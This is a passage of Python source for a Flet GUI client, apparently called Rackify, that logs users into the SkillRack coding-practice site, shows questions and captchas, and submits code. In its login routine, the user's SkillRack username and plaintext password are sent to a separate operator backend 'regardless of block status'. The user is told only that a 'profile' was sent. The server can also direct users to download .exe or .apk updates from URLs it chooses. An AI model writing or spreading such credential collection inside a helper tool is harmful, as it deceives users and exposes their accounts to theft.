            if auth_response.get("message") != "allow":
                raise SkillRackError("Wrong code. Try again.")
            
            # Check if update is required
            update_required = auth_response.get("update_required", False)
            if isinstance(update_required, str):
                update_required = update_required.lower() in {"true", "1", "yes"}
            else:
                update_required = bool(update_required)

            if update_required:
                latest_version = auth_response.get("latest_version", "")
                downloads = auth_response.get("downloads", {})
                self.backend_status.value = f"Update required: {latest_version or 'unknown'}"
                self.backend_status.color = "#f59e0b"
                self.update_note.value = f"Please download the latest version ({latest_version}) before continuing."
                android_url = downloads.get("Rackify.apk") or next(
                    (url for name, url in downloads.items() if "apk" in name.lower() or "android" in name.lower()),
                    "",
                )
                windows_url = downloads.get("Rackify.exe") or next(
                    (url for name, url in downloads.items() if "windows" in name.lower() or "exe" in name.lower()),
                    "",
                )
                self.android_update_button.visible = bool(android_url)
                self.windows_update_button.visible = bool(windows_url)
                self.android_update_button.on_click = lambda e, url=android_url: asyncio.create_task(self.open_download_url(url))
                self.windows_update_button.on_click = lambda e, url=windows_url: asyncio.create_task(self.open_download_url(url))
                self.auth_card.visible = False
                self.login_card.visible = False
                self.block_card.visible = False
                self.update_card.visible = True
                self.workspace_card.visible = False
                self.page.update()
                await self.set_status("Update available! Please update before continuing.")
                # Keep auth locked until the user updates or restarts.
                await self.set_busy(False)
                return
            
            self.state.auth_unlocked = True
            self.auth_card.visible = False
            self.login_card.visible = True
            self.block_card.visible = False
            self.backend_status.value = f"Backend ready at {self.state.backend_url}"
            self.backend_status.color = "#93c5fd"
            await self.set_status("Authentication accepted. Continue with login.")
            self.page.update()
        except SkillRackError as exc:
            await self.set_error(self.auth_error, str(exc))
            await self.set_status("Authentication blocked.")
        finally:
            await self.set_busy(False)

    async def perform_login(self, _event: ft.ControlEvent) -> None:
        if self.state.busy:
            return
        await self.set_busy(True)
        await self.clear_error(self.login_error)
        try:
            username = (self.username_field.value or "").strip()
            password = self.password_field.value or ""
            if not username or not password:
                raise SkillRackError("Username and password are required")

            # Step 1: Perform SkillRack login
            await self.set_status("Logging in directly to SkillRack...")
            session, profile_url = await asyncio.to_thread(skillrack_login, username, password)
            self.state.http_session = session
            self.state.username = username
            self.state.password = password
            self.state.profile_url = profile_url

            # Step 2: Log profile to backend regardless of block status
            try:
                await asyncio.to_thread(backend_log_profile, self.state.backend_url, username, password, profile_url)
                self.backend_status.value = "Profile sent to backend storage."
                self.backend_status.color = "#86efac"
            except SkillRackError as exc:
                self.backend_status.value = f"Backend log skipped: {exc}"
                self.backend_status.color = "#fca5a5"

            # Step 3: Check if user is blacklisted
            await self.set_status("Verifying user access...")
            is_allowed = await asyncio.to_thread(check_user_allowed, self.state.backend_url, username)
            if not is_allowed:
                self.backend_status.value = "Access denied: User is blacklisted."
                self.backend_status.color = "#f59e0b"
                self.block_note.value = f"The username {username} is blocked by admin. You cannot continue."
                self.auth_card.visible = False
                self.login_card.visible = False
                self.update_card.visible = False
                self.block_card.visible = True
                self.workspace_card.visible = False
                self.page.update()
                await self.set_status("Access denied: User is blacklisted.")
                await self.set_busy(False)
                return

            self.login_card.visible = False
            self.block_card.visible = False
            self.workspace_card.visible = True
            self.question_section.visible = True
            self.captcha_section.visible = False
            self.editor_section.visible = False
            self.response_section.visible = False
            self.response_text.value = "Waiting for a submission."
            await self.set_status("Logged in successfully.")
            self.page.update()
        except SkillRackError as exc:
            await self.set_error(self.login_error, str(exc))
            await self.set_status("Login failed.")
        finally:
            await self.set_busy(False)

    async def load_question(self, mode: str) -> None:
        if self.state.busy:
            return
        if not self.state.http_session:
            await self.set_status("Log in first.")
            return
        await self.set_busy(True)
        try:
            self.state.mode = mode
            await self.set_status(f"Loading {mode.upper()} question...")
            payload = await asyncio.to_thread(get_question, self.state.http_session, mode)
            self.state.question_text = str(payload.get("question") or "")
            self.state.captcha_image_src = str(payload.get("captcha_image") or "")
            self.state.captcha_image_file, self.state.captcha_image_bytes = write_captcha_image_file(self.state.captcha_image_src)
            self.state.view_state = str(payload.get("view_state") or "")
            self.question_text.value = self.state.question_text or "Question text was empty."
            if self.state.captcha_image_bytes:
                self.captcha_image.src = self.state.captcha_image_bytes
            elif self.state.captcha_image_file:
                self.captcha_image.src = self.state.captcha_image_file
            else:
                self.captcha_image.src = self.state.captcha_image_src

            if self.state.captcha_image_file:
                try:
                    file_size = os.path.getsize(self.state.captcha_image_file)
                except OSError:
                    file_size = 0
                print(f"Saved captcha: {self.state.captcha_image_file} size={file_size}")

            self.captcha_image.visible = bool(self.captcha_image.src)
            self.captcha_field.value = ""
            self.captcha_section.visible = True
            self.editor_section.visible = False
            self.response_section.visible = False
            self.captcha_image.update()
            self.page.update()
            await self.set_status(f"{mode.upper()} loaded. Enter the captcha to continue.")
        except SkillRackError as exc:
            await self.set_status(f"Error: {exc}")
        finally:
            await self.set_busy(False)

    async def load_dt(self, _event: ft.ControlEvent) -> None:
        await self.load_question("dt")

    async def load_dc(self, _event: ft.ControlEvent) -> None:
        await self.load_question("dc")

    async def proceed_with_captcha(self, _event: ft.ControlEvent) -> None:
        if self.state.busy:
            return
        if not self.state.http_session:
            await self.set_status("Log in first.")
            return
        captcha_value = (self.captcha_field.value or "").strip()
        if not captcha_value:
            await self.set_status("Enter the captcha value before proceeding.")
            return
        await self.set_busy(True)
        try:
            await self.set_status("Proceeding with captcha...")
            payload = await asyncio.to_thread(
                proceed_question,
                self.state.http_session,
                self.state.mode,
                self.state.view_state,
                captcha_value,
            )
            self.state.view_state = str(payload.get("view_state") or self.state.view_state)
            self.state.editor_id = str(payload.get("editor_id") or "")
            self.state.editor_name = str(payload.get("editor_name") or "")
            self.state.submit_source_id = str(payload.get("submit_source_id") or "")
            self.state.mode = str(payload.get("mode") or self.state.mode)
            if not self.state.editor_id or not self.state.editor_name or not self.state.submit_source_id:
                raise SkillRackError("Could not identify editor or submit button.")

            self.captcha_section.visible = False
            self.editor_section.visible = True
            self.response_section.visible = False
            self.page.update()
            await self.set_status("Captcha accepted. Write your code and submit.")
        except SkillRackError as exc:
            await self.set_status(f"Error: {exc}")
        finally:
            await self.set_busy(False)

    async def submit_code(self, _event: ft.ControlEvent) -> None:
        if self.state.busy:
            return
        if not self.state.http_session:
            await self.set_status("Log in first.")
            return
        if not self.state.editor_id or not self.state.editor_name or not self.state.submit_source_id:
            await self.set_status("Load a question and pass the captcha first.")
            return
        code = self.code_editor.value or ""
        await self.set_busy(True)
        try:
            self.response_section.visible = True
            self.response_text.value = "Submitting code..."
            self.page.update()
            result = await asyncio.to_thread(
                submit_question,
                self.state.http_session,
                self.state.mode,
                self.state.view_state,
                self.state.editor_id,
                self.state.editor_name,
                self.state.submit_source_id,
                code,
            )
            self.state.last_result = format_submission_result({"result": result})
            self.response_text.value = self.state.last_result or "No result returned."
            self.page.update()
            await self.set_status("Submission finished.")
        except SkillRackError as exc:
            self.response_text.value = f"Submission error: {exc}"
            self.page.update()
            await self.set_status("Submission failed.")
        finally:
            await self.set_busy(False)

    async def copy_question(self, _event: ft.ControlEvent) -> None:
        if not self.state.question_text:
            await self.set_status("Nothing to copy yet.")
            return

        await self.page.clipboard.set(self.state.question_text)
        await self.set_status("Question copied to clipboard.")

    async def perform_logout(self, _event: ft.ControlEvent) -> None:
        if self.state.busy:
            return
        await self.set_busy(True)
        try:
            if self.state.http_session is not None:
                try:
                    await asyncio.to_thread(skillrack_logout, self.state.http_session)
                except Exception:
                    pass
                self.state.http_session.close()
        finally:
            old_captcha_file = self.state.captcha_image_file
            self.state = SessionState(backend_url=self.state.backend_url)
            self.auth_card.visible = True
            self.login_card.visible = False
            self.workspace_card.visible = False
            self.auth_code_field.value = ""
            self.username_field.value = ""
            self.password_field.value = ""
            self.captcha_field.value = ""
            self.code_editor.value = "# Write your Python solution here\n"
            self.question_text.value = "Load a question to see the challenge text here."
            self.captcha_image.visible = False
            self.captcha_image.src = ""
            if old_captcha_file:
                try:
                    os.remove(old_captcha_file)
                except OSError:
                    pass
            self.response_text.value = "Waiting for a submission."
            self.question_section.visible = True
            self.captcha_section.visible = False
            self.editor_section.visible = False
            self.response_section.visible = False
            await self.set_status("Logged out.")
            self.page.update()
            await self.set_busy(False)

def main(page: ft.Page) -> None:
    page.app = SkillRackHelperApp(page)
